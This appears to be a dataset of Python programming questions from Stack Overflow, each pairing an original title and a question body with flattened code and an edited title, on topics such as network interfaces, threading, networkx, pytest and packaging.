How can i get the IP Address of eth0 in Python?," When an error occurs in a Python script on Unix, an email is sent.I have been asked to add {Testing Environment} to the subject line of the email if the IP address is 192.168.100.37 which is the testing server. This way we can have one version of a script and a way to tell if the email is coming from messed up data on the testing server.However, when I google I keep finding this code: However, that's giving me the IP address of 127.0.1.1. When I use ifconfig I get this Firstly, I don't know where it got 127.0.1.1 from, but either way that's not what I want. When I google I keep coming to the same syntax, Bash scripts or netifaces and I'm trying to use standard libraries.So how can I get the IP address of eth0 in Python? <code>  import socketsocket.gethostbyname(socket.gethostname()) eth0 Link encap:Ethernet HWaddr 00:1c:c4:2c:c8:3e inet addr:192.168.100.37 Bcast:192.168.100.255 Mask:255.255.255.0 UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:75760697 errors:0 dropped:411180 overruns:0 frame:0 TX packets:23166399 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:59525958247 (59.5 GB) TX bytes:10142130096 (10.1 GB) Interrupt:19 Memory:f0500000-f0520000lo Link encap:Local Loopback inet addr:127.0.0.1 Mask:255.0.0.0 UP LOOPBACK RUNNING MTU:16436 Metric:1 RX packets:25573544 errors:0 dropped:0 overruns:0 frame:0 TX packets:25573544 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:44531490070 (44.5 GB) TX bytes:44531490070 (44.5 GB)",How can I get the IP address from a NIC (network interface controller) in Python?
How can I get the IP address of eth0 in Python?," When an error occurs in a Python script on Unix, an email is sent.I have been asked to add {Testing Environment} to the subject line of the email if the IP address is 192.168.100.37 which is the testing server. This way we can have one version of a script and a way to tell if the email is coming from messed up data on the testing server.However, when I google I keep finding this code: However, that's giving me the IP address of 127.0.1.1. When I use ifconfig I get this Firstly, I don't know where it got 127.0.1.1 from, but either way that's not what I want. When I google I keep coming to the same syntax, Bash scripts or netifaces and I'm trying to use standard libraries.So how can I get the IP address of eth0 in Python? <code>  import socketsocket.gethostbyname(socket.gethostname()) eth0 Link encap:Ethernet HWaddr 00:1c:c4:2c:c8:3e inet addr:192.168.100.37 Bcast:192.168.100.255 Mask:255.255.255.0 UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:75760697 errors:0 dropped:411180 overruns:0 frame:0 TX packets:23166399 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:59525958247 (59.5 GB) TX bytes:10142130096 (10.1 GB) Interrupt:19 Memory:f0500000-f0520000lo Link encap:Local Loopback inet addr:127.0.0.1 Mask:255.0.0.0 UP LOOPBACK RUNNING MTU:16436 Metric:1 RX packets:25573544 errors:0 dropped:0 overruns:0 frame:0 TX packets:25573544 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:44531490070 (44.5 GB) TX bytes:44531490070 (44.5 GB)",How can I get the IP address from a NIC (network interface controller) in Python?
How can I get the IP address from NIC in Python?," When an error occurs in a Python script on Unix, an email is sent.I have been asked to add {Testing Environment} to the subject line of the email if the IP address is 192.168.100.37 which is the testing server. This way we can have one version of a script and a way to tell if the email is coming from messed up data on the testing server.However, when I google I keep finding this code: However, that's giving me the IP address of 127.0.1.1. When I use ifconfig I get this Firstly, I don't know where it got 127.0.1.1 from, but either way that's not what I want. When I google I keep coming to the same syntax, Bash scripts or netifaces and I'm trying to use standard libraries.So how can I get the IP address of eth0 in Python? <code>  import socketsocket.gethostbyname(socket.gethostname()) eth0 Link encap:Ethernet HWaddr 00:1c:c4:2c:c8:3e inet addr:192.168.100.37 Bcast:192.168.100.255 Mask:255.255.255.0 UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:75760697 errors:0 dropped:411180 overruns:0 frame:0 TX packets:23166399 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:59525958247 (59.5 GB) TX bytes:10142130096 (10.1 GB) Interrupt:19 Memory:f0500000-f0520000lo Link encap:Local Loopback inet addr:127.0.0.1 Mask:255.0.0.0 UP LOOPBACK RUNNING MTU:16436 Metric:1 RX packets:25573544 errors:0 dropped:0 overruns:0 frame:0 TX packets:25573544 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:44531490070 (44.5 GB) TX bytes:44531490070 (44.5 GB)",How can I get the IP address from a NIC (network interface controller) in Python?
How to reduce {method 'acquire' of 'thread.lock' objects} time," I am using Python 2 subprocess with threading threads to take standard input, process it with binaries A, B, and C and write modified data to standard output. This script (let's call it: A_to_C.py) is very slow and I'd like to learn how to fix it. The general flow is as follows: The idea is that standard input goes into A_to_C.py:The A binary processes a chunk of standard input and creates A-output with the function produceA.The B binary processes a chunk of A's standard output and creates B-output via the function produceB.The C binary processes a chunk of B's standard output via the function produceC and writes C-output to standard output.I did profiling with cProfile and nearly all of the time in this script appears to be spent in acquiring thread locks. For instance, in a test 417s job, 416s (>99% of the total runtime) is spent on acquiring thread locks: What am I doing wrong with my threading.Thread and/or subprocess.Popen arrangement which is causing this issue? <code>  A_process = subprocess.Popen(['A', '-'], stdin=subprocess.PIPE, stdout=subprocess.PIPE)produce_A_thread = threading.Thread(target=produceA, args=(sys.stdin, A_process.stdin))B_process = subprocess.Popen(['B', '-'], stdin=subprocess.PIPE, stdout=subprocess.PIPE)convert_A_to_B_thread = threading.Thread(target=produceB, args=(A_process.stdout, B_process.stdin))C_process = subprocess.Popen(['C', '-'], stdin=subprocess.PIPE)convert_B_to_C_thread = threading.Thread(target=produceC, args=(B_process.stdout, C_process.stdin)) produce_A_thread.start()convert_A_to_B_thread.start()convert_B_to_C_thread.start()produce_A_thread.join()convert_A_to_B_thread.join()convert_B_to_C_thread.join()A_process.wait()B_process.wait()C_process.wait() $ python Python 2.6.6 (r266:84292, Nov 21 2013, 10:50:32) [GCC 4.4.7 20120313 (Red Hat 4.4.7-4)] on linux2 Type ""help"", ""copyright"", ""credits"" or ""license"" for more information. >>> import pstats >>> p = pstats.Stats('1.profile') >>> p.sort_stats('cumulative').print_stats(10) Thu Jun 12 22:19:07 2014 1.profile 1755 function calls (1752 primitive calls) in 417.203 CPU seconds Ordered by: cumulative time List reduced from 162 to 10 due to restriction <10> ncalls tottime percall cumtime percall filename:lineno(function) 1 0.020 0.020 417.203 417.203 A_to_C.py:90(<module>) 1 0.000 0.000 417.123 417.123 A_to_C.py:809(main) 6 0.000 0.000 416.424 69.404 /foo/python/2.7.3/lib/python2.7/threading.py:234(wait) 32 416.424 13.013 416.424 13.013 {method 'acquire' of 'thread.lock' objects} 3 0.000 0.000 416.422 138.807 /foo/python/2.7.3/lib/python2.7/threading.py:648(join) 3 0.000 0.000 0.498 0.166 A_to_C.py:473(which) 37 0.000 0.000 0.498 0.013 A_to_C.py:475(is_exe) 3 0.496 0.165 0.496 0.165 {posix.access} 6 0.000 0.000 0.194 0.032 /foo/python/2.7.3/lib/python2.7/subprocess.py:475(_eintr_retry_call) 3 0.000 0.000 0.191 0.064 /foo/python/2.7.3/lib/python2.7/subprocess.py:1286(wait)",How to speed up communication with subprocesses
How to install PL/Python on PostgreSQL 9.3 x64?," I have tried to install the PL/Python v2.x language inside PostgreSQL on my database running the query: (I got this from http://www.postgresql.org/docs/9.3/static/plpython.html)But I'm getting this error: How to install this in an automated way? I need to install it on many computers. <code>  CREATE EXTENSION plpythonu; ERRO: no pde acessar arquivo ""$libdir/plpython2"": No such file or directory********** Error **********ERRO: no pde acessar arquivo ""$libdir/plpython2"": No such file or directorySQL state: 58P01",How to install PL/Python on PostgreSQL 9.3 x64 Windows 7?
"How to difference between two dates with hours,minuets,seconds.?"," I have taken two dates as I have done it like this, I'm getting minutes and seconds. I want hours too; how can I do this?My code: How can I get hours too? Any help would be appreciated. <code>  import datetimedata1 = datetime.datetime.now()data2 = datetime.datetime.now() diff = data2-data1divmod(diff.days * 86400 + diff.seconds, 60)(3, 45)","How to get the difference between two dates in hours, minutes and seconds.?"
Modularity in Networkx," I am starting to use this interface now, I have some experience with Python but nothing extensive. I am calculating the transitivity and community structure of a small graph: I get the transitivity just fine, however - there is the following error with calculating modularity. I just followed the documentation provided by the networkx site, is there something I am doing wrong?  <code>  import networkx as nxG = nx.read_edgelist(data, delimiter='-', nodetype=str)nx.transitivity(G)#find modularitypart = best_partition(G)modularity(part, G) NameError: name 'best_partition' is not defined",Graph Theory in Networkx
"Python - Implementing a ""Kurtosis filter"" using scipys generic_filter"," I have a 5000*5000 numpy array on which I want to calculate the Kurtosis for windows of size 25. I tried putting scipys own kurtosis function in the generic_filter found in ndimage.filters like so: This never ends and I'm not sure at all of it gives the correct answer. So my first question is if this is a correct way to use the generic_filter with a scipy function. If it happened to be correct, then it is too slow for it to be of any use to me. So my next question would be if there's a faster way to achieve this? For example, thinking about a standard deviation you can simply do something like: This is blazing fast and simply comes from the fact that $\sigma^2 = E[(X -\mu)^2] = E[X^2] - (E[X])^2$.  <code>  import numpy as npfrom scipy.stats import kurtosisfrom scipy.ndimage.filters import generic_filtermat = np.random.random_sample((5000, 5000))kurtosis_filter = generic_filter(mat, kurtosis, size=25, mode='reflect') usual_mean = uniform_filter(mat, size=25, mode='reflect')mean_of_squared = uniform_filter(np.multiply(mat,mat), size=25, mode='reflect')standard_deviation = (mean_of_squared - np.multiply(usual_mean,usual_mean))**.5","Implementing a ""Kurtosis filter"" using scipys generic_filter"
"Is there a more concise way to say ""df.isnull().any().any()"" w/ a Pandas DataFrame?"," This line evaluates to a boolean True/False, as it checks whether a Pandas dataframe contains any NaN's in its rows or columns. Is there a more concise/idiomatic way of checking this? <code>  df.isnull().any().any()","More idiomatic version of ""df.isnull().any().any()"" w/ a Pandas DataFrame?"
pytest: How can I determine if a test passed or failed by examining the Item object passed to the pytest_runtest_teardown?," Pytest allows you to hook into the teardown phase for each test by implementing a function called pytest_runtest_teardown in a plugin: Is there an attribute or method on item that I can use to determine whether the test that just finished running passed or failed? I couldn't find any documentation for pytest.Item and hunting through the source code and playing around in ipdb didn't reveal anything obvious. <code>  def pytest_runtest_teardown(item, nextitem): pass",How can I determine if a test passed or failed by examining the Item object passed to the pytest_runtest_teardown?
netwrokx largest component no longer working?," according to networkx documentation, connected_component_subgraphs(G) returns a sorted list of all components. Thus the very first one should be the largest component.However, when I try to get the largest component of a graph G using the example code on the documentation page I get It used to work on my other computer with earlier versions of networkx (1.7 I think, not 100% sure)Now I am using a different computer with python 2.7.7 and networkx 1.9. Is it a version problem?I have written a small function with a couple lines myself to find the largest component, just wondering why this error came out.BTW, I can get the components by converting the generator object to a list. But the list is not sorted by component size as stated in the documentation.example: output: looks like when the node names are large numbers and when there are a bunch of single nodes, the returned subgraphs are not sorted properly <code>  G=nx.path_graph(4)G.add_edge(5,6)H=nx.connected_component_subgraphs(G)[0] TypeError: 'generator' object has no attribute '__getitem__' components = [comp for comp in nx.connected_components(G)] G = nx.Graph()G.add_edges_from([(1,2),(1,3),(4,5)])G.add_nodes_from(range(6,20))components = [comp for comp in nx.connected_components(G)]component_size = [len(comp) for comp in components]print G.number_of_nodes(), G.number_of_edges(), component_sizeG = nx.Graph()G.add_edges_from([(1000,2000),(1000,3000),(4000,5000)])G.add_nodes_from(range(6,20))components = [comp for comp in nx.connected_components(G)]component_size = [len(comp) for comp in components]print G.number_of_nodes(), G.number_of_edges(), component_size 19 3 [3, 2, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]19 3 [2, 1, 1, 1, 1, 3, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]",NetworkX largest component no longer working?
Excluding directory from Pyflakes," I am working on a django project and am trying to run pyflakes on an app in it. I need to exclude the ""migrations"" directory from pyflakes. For pep8 I can do Is there any similar way for pyflakes? I couldn't find any proper documentation for pyflakes. <code>  pep8 --exclude=migrations app_name",Excluding directory
python program stops on virtual machine vmware," I searched a lot about problem VMware with python, but I didn't find any information about my problem.My problem is that python programs freeze, process is still running but it doesn't use CPU and memory usage doesn't change.Program doesn't return any exception or anything... it just freeze and it never back to execution. It looks that it happens randomly and it is not a problem with no memory available for my machine, because in the same time I can execute it in another session.My machine is virtual machine with: Windows Server 2008 64-bit, VMware Tools 9.4.5I tried python: 2.7, 3.3 and 3.4my example script: (but not only this script freeze) example output is: and it freeze, it is randomly on which step (sometimes 4, 15, 34...) All what I can do is kill the process and run it again.During the execution I can see that program repeatable use 1,2GB RAM and release... use and release. Freeze is always after release memory and from this time memory usage is stable and CPU usage 0% for this process.I run the script in IDLE to play with debugger and stack viewer, but when the program freeze, the whole idle is not responding.Also I tried it on others no-virtual machine and there is no problem.I would be grateful for any suggestions, how to solve or debug that kind o problems. <code>  print(""START"")for i in range(0, 1000): print(""step: "" + str(i)) file = open(""./test_file.csv"", ""r"") #file size is 1.2GB but I have 10GB RAM for line in file.readlines(): pass file.close() #close the fileprint(""END"") STARTstep 0step 1step 2step 3step 4",python program stops in command line
Selenium can't connect to GhostDriver," I've setup a simple webscraping script in Python w/ Selenium and PhantomJS. I've got about 200 URLs in total to scrape. The script runs fine at first then after about 20-30 URLs (it can be more/less as it seems random when it fails and isn't related to any particular URL) I get the following error in python: And my ghostdriver.log: I've searched and most of the questions on SO seem to be that they can't even run a single URL. The only other question I've found where the error occurs at the middle of the script is this one and the answer is to upgrade phantomjs to the latest version, which I've done. The other answer simply says to try that URL again and doesn't seem a good solution since the URL could simply fail again.I am running phantomjs version 1.9.7 and selenium version 2.42.1 on Linux Mint 17 on python 2.7.6 <code>  selenium.common.exceptions.WebDriverException: Message: 'Can not connect to GhostDriver' PhantomJS is launching GhostDriver...[ERROR - 2014-07-04T17:27:37.519Z] GhostDriver - main.fail - {""message"":""Could not start Ghost Driver"",""line"":82,""sourceId"":140692115795456,""sourceURL"":"":/ghostdriver/main.js"",""stack"":""Error: Could not start Ghost Driver\n at :/ghostdriver/main.js:82"",""stackArray"":[{""sourceURL"":"":/ghostdriver/main.js"",""line"":82}]} for url in ['example.com/1/', 'example.com/2/', 'example.com/3/', .. , ..]: user_agent = 'Chrome' dcap = dict(DesiredCapabilities.PHANTOMJS) dcap['phantomjs.page.settings.userAgent'] = user_agent driver = webdriver.PhantomJS(executable_path='/usr/bin/phantomjs', desired_capabilities=dcap) driver.get(url)",Selenium can't connect to GhostDriver (but only sometimes)
I don't understand python MANIFEST.in," The ""Python Distribute"" guide (was at python-distribute.org, but that registration has lapsed) tells me to include doc/txt files and .py files are excluded in MANIFEST.in fileThe sourcedist documentation tells me only sdist uses MANIFEST.in and only includes file you specify and to include .py files. It also tells me to use: python setup.py sdist --manifest-only to generate a MANIFEST, but python tells me this doesn't existI appreciate these are from different versions of python and the distribution system is in acomplete mess, but assuming I am using python 3 and setuptools (the new one that includes distribute but now called setuptools, not the old setuptools that was deprecated for distribute tools only to be brought back into distribute and distribute renamed to setuptools.....)and I'm following the 'standard' folder structure and setup.py file, Do I need a MANIFEST.in ?What should be in it ?When will all these different package systems and methods be made into one single simple process ? <code> ","Do python projects need a MANIFEST.in, and what should be in it?"
Python: What does the slash mean in the output of help(range)?," What does the / mean in Python 3.4's help output for range before the closing parenthesis? <code>  >>> help(range)Help on class range in module builtins:class range(object) | range(stop) -> range object | range(start, stop[, step]) -> range object | | Return a virtual sequence of numbers from start to stop by step. | | Methods defined here: | | __contains__(self, key, /) | Return key in self. | | __eq__(self, value, /) | Return self==value. ...",What does the slash mean in help() output?
Python: What does the slash mean in help() output?," What does the / mean in Python 3.4's help output for range before the closing parenthesis? <code>  >>> help(range)Help on class range in module builtins:class range(object) | range(stop) -> range object | range(start, stop[, step]) -> range object | | Return a virtual sequence of numbers from start to stop by step. | | Methods defined here: | | __contains__(self, key, /) | Return key in self. | | __eq__(self, value, /) | Return self==value. ...",What does the slash mean in help() output?
how to creat a dataframe by repeating series multiple times?," Is there any function like the following to create a dataframe with ten columns of Series s? Thank you! <code>  df = pd.DataFrame(s, 10)",how to create a dataframe by repeating series multiple times?
What does cls() function do inside a function?," Today I'm viewing another's code, and saw this: what does this cls() function do here?If I got some other classes inherit this A class, call it C, when calling this get method, would this o use C class as the caller of cls()? <code>  class A(B): # Omitted bulk of irrelevant code in the class def __init__(self, uid=None): self.uid = str(uid) @classmethod def get(cls, uid): o = cls(uid) # Also Omitted lots of code here",What does cls() function do inside a class method?
AttributeError with imports in __init__.py," I've run into a problem with having imports in __init__.py and using import as with absolute imports in modules of the package.My project has a subpackage and in its __init__.py I ""lift"" one of the classes from a module to the subpackage level with from import as statement. The module imports other modules from that subpackage with absolute imports. I get this error AttributeError: 'module' object has no attribute 'subpkg'.ExampleStructure: pkg/init.py is empty.pkg/subpkg/init.py: pkg/subpkg/one.py: pkg/subpkg/two_longname.py: pkg/tst.py: Output: WorkaroundsThere are changes that make it work:Empty pkg/subpkg/__init__.py and importing directly from pkg.subpkg.one.I don't consider this as an option because AFAIK ""lifting"" things to the package level is ok. Here is quote from an article:One common thing to do in your __init__.py is to import selectedClasses, functions, etc into the package level so they can beconveniently imported from the package.Changing import as to from import in one.py: The only con here is that I can't create a short alias for module. I got that idea from @begueradj's answer.It is also possible to use a relative import in one.py to fix the problem. But I think it's just a variation of workaround #2.QuestionsCan someone explain what is actually going on here? Why a combination of imports in __init__.py and usage of import as leads to such problems?Are there any better workarounds?Original exampleThis is my original example. It's not very realistic but I'm not deleting it so @begueradj's answer still makes sense.pkg/init.py is empty.pkg/subpkg/init.py: pkg/subpkg/one.py: pkg/subpkg/two.py: pkg/tst.py: Output: Initially I had this in one.py: In that case I get error on import (just like in my original project which uses import as too). <code>  pkg/ __init__.py subpkg __init__.py one.py two_longname.py tst.py from pkg.subpkg.one import One import pkg.subpkg.two_longname as twoclass One(two.Two): pass class Two: pass from pkg.subpkg import Oneprint(One) $ python3.4 -m pkg.tstTraceback (most recent call last): File ""/usr/lib/python3.4/runpy.py"", line 170, in _run_module_as_main ""__main__"", mod_spec) File ""/usr/lib/python3.4/runpy.py"", line 85, in _run_code exec(code, run_globals) File ""/home/and/dev/test/python/imptest2/pkg/tst.py"", line 1, in <module> from pkg.subpkg import One File ""/home/and/dev/test/python/imptest2/pkg/subpkg/__init__.py"", line 1, in <module> from pkg.subpkg.one import One File ""/home/and/dev/test/python/imptest2/pkg/subpkg/one.py"", line 1, in <module> import pkg.subpkg.two_longname as twoAttributeError: 'module' object has no attribute 'subpkg' from pkg.subpkg import two_longname class One(two_longname.Two): pass from pkg.subpkg.one import ONE import pkg.subpkg.twoONE = pkg.subpkg.two.TWO TWO = 2 from pkg.subpkg import ONE $ python3.4 -m pkg.tstTraceback (most recent call last): File ""/usr/lib/python3.4/runpy.py"", line 170, in _run_module_as_main ""__main__"", mod_spec) File ""/usr/lib/python3.4/runpy.py"", line 85, in _run_code exec(code, run_globals) File ""/home/and/dev/test/python/imptest/pkg/tst.py"", line 1, in <module> from pkg.subpkg import ONE File ""/home/and/dev/test/python/imptest/pkg/subpkg/__init__.py"", line 2, in <module> from pkg.subpkg.one import ONE File ""/home/and/dev/test/python/imptest/pkg/subpkg/one.py"", line 6, in <module> ONE = pkg.subpkg.two.TWOAttributeError: 'module' object has no attribute 'subpkg' import pkg.subpkg.two as twoONE = two.TWO",Imports in __init__.py and 'import as' statement
Imports in __init__.py and `import as` statement," I've run into a problem with having imports in __init__.py and using import as with absolute imports in modules of the package.My project has a subpackage and in its __init__.py I ""lift"" one of the classes from a module to the subpackage level with from import as statement. The module imports other modules from that subpackage with absolute imports. I get this error AttributeError: 'module' object has no attribute 'subpkg'.ExampleStructure: pkg/init.py is empty.pkg/subpkg/init.py: pkg/subpkg/one.py: pkg/subpkg/two_longname.py: pkg/tst.py: Output: WorkaroundsThere are changes that make it work:Empty pkg/subpkg/__init__.py and importing directly from pkg.subpkg.one.I don't consider this as an option because AFAIK ""lifting"" things to the package level is ok. Here is quote from an article:One common thing to do in your __init__.py is to import selectedClasses, functions, etc into the package level so they can beconveniently imported from the package.Changing import as to from import in one.py: The only con here is that I can't create a short alias for module. I got that idea from @begueradj's answer.It is also possible to use a relative import in one.py to fix the problem. But I think it's just a variation of workaround #2.QuestionsCan someone explain what is actually going on here? Why a combination of imports in __init__.py and usage of import as leads to such problems?Are there any better workarounds?Original exampleThis is my original example. It's not very realistic but I'm not deleting it so @begueradj's answer still makes sense.pkg/init.py is empty.pkg/subpkg/init.py: pkg/subpkg/one.py: pkg/subpkg/two.py: pkg/tst.py: Output: Initially I had this in one.py: In that case I get error on import (just like in my original project which uses import as too). <code>  pkg/ __init__.py subpkg __init__.py one.py two_longname.py tst.py from pkg.subpkg.one import One import pkg.subpkg.two_longname as twoclass One(two.Two): pass class Two: pass from pkg.subpkg import Oneprint(One) $ python3.4 -m pkg.tstTraceback (most recent call last): File ""/usr/lib/python3.4/runpy.py"", line 170, in _run_module_as_main ""__main__"", mod_spec) File ""/usr/lib/python3.4/runpy.py"", line 85, in _run_code exec(code, run_globals) File ""/home/and/dev/test/python/imptest2/pkg/tst.py"", line 1, in <module> from pkg.subpkg import One File ""/home/and/dev/test/python/imptest2/pkg/subpkg/__init__.py"", line 1, in <module> from pkg.subpkg.one import One File ""/home/and/dev/test/python/imptest2/pkg/subpkg/one.py"", line 1, in <module> import pkg.subpkg.two_longname as twoAttributeError: 'module' object has no attribute 'subpkg' from pkg.subpkg import two_longname class One(two_longname.Two): pass from pkg.subpkg.one import ONE import pkg.subpkg.twoONE = pkg.subpkg.two.TWO TWO = 2 from pkg.subpkg import ONE $ python3.4 -m pkg.tstTraceback (most recent call last): File ""/usr/lib/python3.4/runpy.py"", line 170, in _run_module_as_main ""__main__"", mod_spec) File ""/usr/lib/python3.4/runpy.py"", line 85, in _run_code exec(code, run_globals) File ""/home/and/dev/test/python/imptest/pkg/tst.py"", line 1, in <module> from pkg.subpkg import ONE File ""/home/and/dev/test/python/imptest/pkg/subpkg/__init__.py"", line 2, in <module> from pkg.subpkg.one import ONE File ""/home/and/dev/test/python/imptest/pkg/subpkg/one.py"", line 6, in <module> ONE = pkg.subpkg.two.TWOAttributeError: 'module' object has no attribute 'subpkg' import pkg.subpkg.two as twoONE = two.TWO",Imports in __init__.py and 'import as' statement
"How do you have an attribute called ""property""?"," I have a bit of a problem, and I've tried googling, but it doesn't turn up anything helpful.I'm designing a django application and I want/need to have a field called ""property"". The reason for this is that is the technical title of the thing I'm trying to manage, and where possible I'd like to keep the business terminology.Now this hasn't been a problem... up until now.I now need to have a method, that I'd like to be able to use as a property, but there is a bit of a clash around the use of the token property. I understandably get this error. Is there a way around this that lets me treat this method as a property, and keep the property attribute? <code>  class DataElementConcept(trebleObject): template = ""polls/dataElementConcept.html"" objectClass = models.ForeignKey(ObjectClass,blank=True,null=True) property = models.ForeignKey(Property,blank=True,null=True) @property def registryCascadeItems(self): return [self.objectClass,self.property] File ""/home/theodore/Github/possum-mdr/polls/models.py"", line 381, in DataElementConcept @propertyTypeError: 'ForeignKey' object is not callable","How do you have an attribute called ""property"" and use the @property decorator?"
understanding thread.join(timeout)," So the timeout param, for a thread, should stop the thread after timeout seconds (if it hasn't terminated yet).In my software I'm trying to replace a Queue.Queue.join() (it contains an item for every thread: each thread will run Queue.Queue.task_done()) that could stop the software if a thread doesn't terminate. So if a thread, among other 50, doesn't terminate then it is all freezed.I want that every thread stops in 5 seconds, for example. So i will start each thread with timeout of 5 seconds. Is it correct?CODE RESULTIt is not properly working.. every thread should stop after 1 second. Thread 0 stops after 3 secs, thread 1 after 2 secs.  <code>  import threadingimport timedef tt(name, num): while True: num += 0.5 print 'thread ' + str(name) + ' at time ' + str(num) time.sleep(0.5)for i in range(3): t=threading.Thread(target=tt, args=(i, 0)) t.setDaemon(True) t.start() t.join(timeout=1)print 'end' thread 0 at time 0.5thread 0 at time 1.0thread 1 at time 0.5thread 0 at time 1.5thread 0 at time 2.0thread 1 at time 1.0thread 2 at time 0.5thread 0 at time 2.5thread 1 at time 1.5thread 2 at time 1.0thread 1 at time 2.0thread 0 at time 3.0end",Understanding thread.join(timeout)
What does bool() actually do in python?," When it is being used in everyday coding? I am learning Python using this tutorial. What am I referring to is described here (middle of the page), but I can't get it. I understand the principles of using True and False, but I don't get when (or do) we actually use the bool() function in practice while writing our code. It would help me if you give the everyday, practical example of bool() in code. <code> ",What is the practical application of bool() in Python?
Python Flask how to get parameters from a URL?," When the user accesses this URL running on my flask app, I want the web service to be able to handle the parameters specified after the question mark: <code>  http://10.1.1.1:5000/login?username=alex&password=pw1#I just want to be able to manipulate the parameters@app.route('/login', methods=['GET', 'POST'])def login(): username = request.form['username'] print(username) password = request.form['password'] print(password)",How can I get the named parameters from a URL using Flask?
How to check whether two edges are connected in Python's NetworkX?," I have a NetworkX graph with four nodes (a,b,c,d) which are partially connected. How can I check whether two nodes are adjacent? For example: How could I assert that a and d are not adjacent? I tried the following, but failed: <code>  import networkx as nxG=nx.Graph()G.add_edge('a','b',weight=1)G.add_edge('a','c',weight=1)G.add_edge('c','d',weight=1) nx.is_connected(G) # I assume it checks whether edges are connected at allnx.connected_components(G) # outputs an object that I can make no use of",How to check whether two nodes are connected?
calculate hash value for a folder using python," I'm using this code to calculate hash value for a file: when I tried it on a folder ""folder""I got How could I calculate the hash value for a folder ? <code>  m = hashlib.md5()with open(""calculator.pdf"", 'rb') as fh: while True: data = fh.read(8192) if not data: break m.update(data) hash_value = m.hexdigest() print hash_value IOError: [Errno 13] Permission denied: folder",How can I calculate a hash for a filesystem-directory using Python?
Is there a way to gray out a tkinter Frame?," I want to create a GUI in tkinter with two Frames, and have the bottom Frame grayed out until some event happens.Below is some example code: Is this possible without having to individually gray out all of the frame2's widgets?I'm using Tkinter 8.5 and Python 3.3.  <code>  from tkinter import *from tkinter import ttkdef enable(): frame2.state(statespec='enabled') #Causes errorroot = Tk()#Creates top frameframe1 = ttk.LabelFrame(root, padding=(10,10,10,10))frame1.grid(column=0, row=0, padx=10, pady=10)button2 = ttk.Button(frame1, text=""This enables bottom frame"", command=enable)button2.pack()#Creates bottom frameframe2 = ttk.LabelFrame(root, padding=(10,10,10,10))frame2.grid(column=0, row=1, padx=10, pady=10)frame2.state(statespec='disabled') #Causes errorentry = ttk.Entry(frame2)entry.pack()button2 = ttk.Button(frame2, text=""button"")button2.pack()root.mainloop()",Is there a way to gray out (disable) a tkinter Frame?
Removing a string without mutation in python," Assume you have a list I'd like to make a new list n that has everything except for a given item in m (for example the item 'a'). However, when I use the original list is mutated (the value 'a' is removed from the original list). Is there a way to get a new list sans-'a' without mutating the original? So I mean that m should still be [ 'a', 'b', 'c' ], and I will get a new list, which has to be [ 'b', 'c' ]. <code>  >>> m = ['a','b','c'] >>> m.remove('a')>>> mm = ['b', 'c']",Remove list element without mutation
"Python CSV writer, how to handle quotes in order to avoid tripple quotes in output"," I am working with Python's CSV module, specifically the writer. My question is how can I add double quotes to a single item in a list and have the writer write the string the same way as a print statement would?for example: I tired adding a quoting=csv.QUOTE_NONE option, but that raised an error. I am guessing this is related to the many csv dialects, I was hoping to avoid digging too far into that.In retrospect I could probably have built my initial data set smarter and perhaps avoided the need for this situation but at this point curiosity is really getting the better of me (this is a simplified example): how do you keep the written output from adding those extra quotes? <code>  import csv#test ""data""test = ['item1','01','001',1]csvOut = csv.writer(open('file.txt','a')) #'a' used for keeping past resultstest[1] = '""'+test[1]+'""'print test#prints: ['item1', '""01""', '001', 1]csvOut.writerow(test)#written in the output file: item1,""""""01"""""",001,1#I was expecting: item1,""01"",001,1del csvOut","Python CSV writer, how to handle quotes in order to avoid triple quotes in output"
How to get the MySQL type of error with pymysql?, I'm doing a Python application with MySQL and PyMySQL and I'd like to be able to know the number of the MySQL error when I get one so that I can do something different depending on it.Is there a way to do that with a try-except statement or another way? <code> ,How to get the MySQL type of error with PyMySQL?
Create PyString without copy, I have a large buffer of strings (basically 12GB) from a C app.I would like to create PyString objects in C for an embedded Python interpreter without copying the strings. Is this possible? <code> ,Create PyString from c character array without copying
Create PyString from c charracter array without copying, I have a large buffer of strings (basically 12GB) from a C app.I would like to create PyString objects in C for an embedded Python interpreter without copying the strings. Is this possible? <code> ,Create PyString from c character array without copying
Python Equivalent of R's which()," Variations of this question have been asked before, I'm still having trouble understanding how to actually slice a python series/pandas dataframe based on conditions that I'd like to set.In R, what I'm trying to do is: The which() function finds indices of row entries in a column in the dataframe which are greater than somenumberIchoose, and returns this as a vector. Then, I slice the dataframe by using these row indices to indicate which rows of the dataframe I would like to look at in the new form.Is there an equivalent way to do this in python? I've seen references to enumerate, which I don't fully understand after reading the documentation. My sample in order to get the row indices right now looks like this: However, I keep on getting an invalid syntax error. I can hack a workaround by for looping through the values, and manually doing the search myself, but that seems extremely non-pythonic and inefficient.What exactly does enumerate() do? What is the pythonic way of finding indices of values in a vector that fulfill desired parameters?Note: I'm using Pandas for the dataframes <code>  df[which(df[,colnumber] > somenumberIchoose),] indexfuture = [ x.index(), x in enumerate(df['colname']) if x > yesterday] ",Pandas Equivalent of R's which()
Does Pythons tarfile.open need close()?," In the official python documentation of tarfile I don't see wether a tarfile created with should be closed once you don't need it anymore.In some other examples (e.g. here) you often see the tarfile not to be closed.Do I run into problems if I open the same tarfile more often in some functions without always closing it? Is there a difference in opening a tarfile in 'r' instead of 'w' mode (except the obvious read/write)?Cause in the examples they always close the tarfile if it was opened with write mode 'w'? <code>  tarfile.open('example.tar', 'r:*') def example(name): f = tarfile.open(name, 'r:*') # do some other stuff # not closing the tarfile object return resultexample('example.tar')example('example.tar')",Does Python's tarfile.open need close()?
